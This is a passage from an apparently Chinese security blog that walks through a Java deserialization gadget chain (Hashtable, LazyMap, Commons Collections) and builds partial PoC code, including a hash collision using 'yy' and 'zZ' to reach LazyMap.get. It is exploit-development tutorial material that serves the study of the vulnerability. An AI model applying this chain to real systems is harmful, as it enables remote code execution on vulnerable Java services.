loadFactor<span class=\"token punctuation\">,</span> <span class=\"token constant\">MAX_ARRAY_SIZE</span> <span class=\"token operator\">+</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>        count <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        <span class=\"token comment\">// Read the number of elements and then all the key/value objects</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> elements <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> elements<span class=\"token operator\">--</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>                <span class=\"token class-name\">K</span> key <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">)</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>            <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>                <span class=\"token class-name\">V</span> value <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">)</span>s<span class=\"token punctuation\">.</span><span class=\"token function\">readObject</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            <span class=\"token comment\">// synch could be eliminated for performance</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token function\">reconstitutionPut</span><span class=\"token punctuation\">(</span>table<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p><em><strong>第一个小问题</strong></em> :<br />\n 我们想要走到 <code>reconstitutionPut</code> ，看一下条件，判断 <code>elements</code>  是否大于 0, <code>elements</code>  是 <code>s.readInt()</code>  得到的，它会去读取数组的原始元素数 ，s 是序列化时写入的。<br />\n<em><strong>序列化代码</strong></em></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 循环进行存储 key 和 value</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">while</span> <span class=\"token punctuation\">(</span>entryStack <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            s<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>entryStack<span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            s<span class=\"token punctuation\">.</span><span class=\"token function\">writeObject</span><span class=\"token punctuation\">(</span>entryStack<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            entryStack <span class=\"token operator\">=</span> entryStack<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>ok, 只要我们 <code>put</code>  值， <code>elements</code>  这就能过去，然后走到 <code>reconstitutionPut</code> ，传入三个值 <code>table</code> 、 <code>key</code> 、 <code>value</code> ，<br />\n <code>table</code>  是在上面 <code>new Entry&lt;?,?&gt;[length]</code> ， <code>key</code>  就是 <code>put</code>  进去的 <code>key</code>  值， <code>value</code>  就是 <code>put</code>  进去的 <code>value</code> 。</p>\n<blockquote>\n<p>现在来到  <code>reconstitutionPut</code></p>\n</blockquote>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">private</span> <span class=\"token keyword\">void</span> <span class=\"token function\">reconstitutionPut</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">,</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span> tab<span class=\"token punctuation\">,</span> <span class=\"token class-name\">K</span> key<span class=\"token punctuation\">,</span> <span class=\"token class-name\">V</span> value<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">throws</span> <span class=\"token class-name\">StreamCorruptedException</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>value <span class=\"token operator\">==</span> <span class=\"token keyword\">null</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>            <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>StreamCorruptedException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token comment\">// Makes sure the key is not already in the hashtable.</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token comment\">// This should not happen in deserialized version.</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        <span class=\"token keyword\">int</span> hash <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        <span class=\"token keyword\">int</span> index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>hash <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x7FFFFFFF</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> tab<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">,</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> e <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">;</span> e <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">;</span> e <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>hash <span class=\"token operator\">==</span> hash<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> e<span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>StreamCorruptedException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>        <span class=\"token comment\">// Creates the new entry.</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>        <span class=\"token annotation punctuation\">@SuppressWarnings</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"unchecked\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>            <span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span> e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">)</span>tab<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        tab<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>        count<span class=\"token operator\">++</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>可以看到，我们想要利用的 <code>e.key.equals(key)</code> ， <code>e.key</code>  要是我们的 lazyMap, 但是现在我们不知道如何对 <code>e.key</code>  进行赋值，记住这一点，先来看如何走到这里， 它在 for 循环里面，但是 for 循环有个条件  <code>Entry&lt;?,?&gt; e = tab[index]</code> ，上面说过，传入的 tab 是一个空值，并没有赋值，所以这里是进不去的，接着往下看</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span> e <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">K</span><span class=\"token punctuation\">,</span><span class=\"token class-name\">V</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">)</span>tab<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>tab<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span>hash<span class=\"token punctuation\">,</span> key<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>它把当前的传来的值赋给了 <code>tab[index]</code> ，然后返回到 <code>readObject</code>  的 <code>for</code>  循环，现在的 <code>tab</code>  不是可以控制了，那么只要我们再进入一次 <code>reconstitutionPut</code> ，就能正常进入 <code>reconstitutionPut</code>  的 <code>for</code>  循环了，所以我们要 <code>put</code>  两次值，第一次 put 的值会在第一次循环结束后给到 tab 里，并在 reconstitutionPut 的 for 里给到 e，那么就清楚的知道，e.key 就是我们第一次 put 进入的 key 值，e.key.equals (key) 里的 key 就是我们第二次 put 进入的 key 值</p>\n<blockquote>\n<p>拦路虎 if</p>\n</blockquote>\n<p><em><strong>第二个小问题</strong></em> ：进入 for 之后发现又遇到了一个东西， <code>(e.hash == hash) &amp;&amp; e.key.equals(key)</code> ，它会去判断  <code>e.hash</code>  和 <code>hash</code>  是否相等，满足后才能走到 <code>e.key.equals()</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">int</span> hash <span class=\"token operator\">=</span> key<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">int</span> index <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span>hash <span class=\"token operator\">&amp;</span> <span class=\"token number\">0x7FFFFFFF</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">%</span> tab<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token class-name\">Entry</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token operator\">?</span><span class=\"token punctuation\">,</span><span class=\"token operator\">?</span><span class=\"token punctuation\">></span></span> e <span class=\"token operator\">=</span> tab<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span> <span class=\"token punctuation\">;</span> e <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">;</span> e <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">.</span>hash <span class=\"token operator\">==</span> hash<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> e<span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                <span class=\"token keyword\">throw</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\"><span class=\"token namespace\">java<span class=\"token punctuation\">.</span>io<span class=\"token punctuation\">.</span></span>StreamCorruptedException</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>先来分析  <code>e</code> ， <code>e</code>  是从 <code>tab[index]</code>  中拿到的， <code>e</code>  的 <code>hash</code>  就是我们第一次 <code>put</code>  的 <code>key</code>  的 <code>hash</code>  ,  <code>hash</code>  就是当前 <code>key</code>  的 <code>hashCode</code>  。 <code>key</code>  的 <code>hash</code>  是如何得到的呢，先来看一个前置条件，如果我们想要利用到  <code>equals</code>  ，那么  <code>e.key</code>  要等于  <code>lazyMap</code> ，就是说 <code>put</code>  的 <code>key</code>  要是 <code>lazyMap</code> ， <code>equals(key)</code>  里的 <code>key</code>  也要是一个 <code>lazyMap</code> , 这样才能走到 <code>AbstractMapDecorator::equals</code>  的时候 <code>equals</code>  传入的值才会是 <code>lazyMap</code> , 才能调用到 <code>lazyMap</code>  的 <code>get</code>  方法。</p>\n<p>查看 <code>lazyMap</code>  的 <code>hash</code>  是如何获取的</p>\n<p><code>lazyMap</code>  的 <code>hash</code></p>\n<p>因为  <code>LazyMap</code>  并没有  <code>hashCode</code>  方法，所以走到了它父类 <code>AbstractMapDecorator</code>  的 <code>hashCode</code>  方法，它返回的是  <code>map</code>  的 <code>hashCode()</code> , 也就是 <code>lazyMap</code>  在 <code>put</code>  值时的 <code>key::hashCode()</code>  值</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token keyword\">int</span> <span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token keyword\">return</span> map<span class=\"token punctuation\">.</span><span class=\"token function\">hashCode</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>当前思路是两次 <code>put</code>  的 <code>key</code>  值相同， <code>hash</code>  就能相同，就能够通过这个 <code>if</code>  判断，但是现实不是那么的顺利，在 <code>put</code>  时它会去循环检查传入的 <code>key</code>  是否已经存在，如果存在是不会存入的</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">//put 循环检查代码</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">for</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">;</span> entry <span class=\"token operator\">!=</span> <span class=\"token keyword\">null</span> <span class=\"token punctuation\">;</span> entry <span class=\"token operator\">=</span> entry<span class=\"token punctuation\">.</span>next<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>entry<span class=\"token punctuation\">.</span>hash <span class=\"token operator\">==</span> hash<span class=\"token punctuation\">)</span> <span class=\"token operator\">&amp;&amp;</span> entry<span class=\"token punctuation\">.</span>key<span class=\"token punctuation\">.</span><span class=\"token function\">equals</span><span class=\"token punctuation\">(</span>key<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>                <span class=\"token class-name\">V</span> old <span class=\"token operator\">=</span> entry<span class=\"token punctuation\">.</span>value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>                entry<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> value<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>                <span class=\"token keyword\">return</span> old<span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>            <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token punctuation\">&#125;</span></pre></td></tr></table></figure><p>所以需要到一个新东西，就是 <code>hash</code>  碰撞，就是当两个值不相同时，但它们的 <code>hash</code>  值相同，这里使用 'zZ' 和 'yy'，它们在 java 中的 hashCode 是相同的<br />\n现在实现的基本思路已经有了，开始写 PoC<br />\n<em><strong> 解决第一个小问题</strong></em><br />\n第一个小问题很容易解决，只要我们 put 两次值就可以正常走到 for 里面</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">Hashtable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashtable <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Hashtable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>hashtable<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>hashtable<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><em><strong>解决第二个小问题</strong></em><br />\n使得 hash 相等<br />\n我们在分析第二个问题时已经知道，我们需要在 <code>hashtable::put</code>  时两个 <code>key</code>  都必须是我们想要执行 <code>lazyMap</code> , 所以把 <code>lazyMap</code>  放进去</p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashMap1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Map</span> decorateMap1 <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>hashMap1<span class=\"token punctuation\">,</span> transform<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashMap2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">Map</span> decorateMap2 <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>hashMap2<span class=\"token punctuation\">,</span> transform<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        <span class=\"token class-name\">Hashtable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashtable <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Hashtable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>        hashtable<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>decorateMap1<span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        hashtable<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>decorateMap2<span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>现在解决 <code>hash</code>  相等的问题，上面分析知道， <code>hash</code>  的值是 <code>lazyMap::put</code>  传入的 <code>key</code>  值，所以只要我们 <code>lazyMap</code>  传入的 <code>key</code>  的 <code>hash</code>  相等，就能通过 <code>if</code></p>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashMap1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>        <span class=\"token class-name\">Map</span> decorateMap1 <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>hashMap1<span class=\"token punctuation\">,</span> transform<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        decorateMap1<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"yy\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>        <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashMap2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">HashMap</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>        <span class=\"token class-name\">Map</span> decorateMap2 <span class=\"token operator\">=</span> <span class=\"token class-name\">LazyMap</span><span class=\"token punctuation\">.</span><span class=\"token function\">decorate</span><span class=\"token punctuation\">(</span>hashMap2<span class=\"token punctuation\">,</span> transform<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        decorateMap2<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"zZ\"</span><span class=\"token punctuation\">,</span><span class=\"token string\">\"2\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>        <span class=\"token class-name\">Hashtable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">Object</span><span class=\"token punctuation\">,</span> <span class=\"token class-name\">Object</span><span class=\"token punctuation\">></span></span> hashtable <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Hashtable</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token punctuation\">></span></span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>        hashtable<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>decorateMap1<span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>        hashtable<span class=\"token punctuation\">.</span><span class=\"token function\">put</span><span class=\"token punctuation\">(</span>decorateMap2<span class=\"token punctuation\">,</span><span class=\"token string\">\"1\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p>现在来说我们已经满足了它的条件，进行序列化和反序列化测试，在序列化时就执行了命令，就会走到 <code>AbstractMap</code>  中 <code>m.get(key)</code> 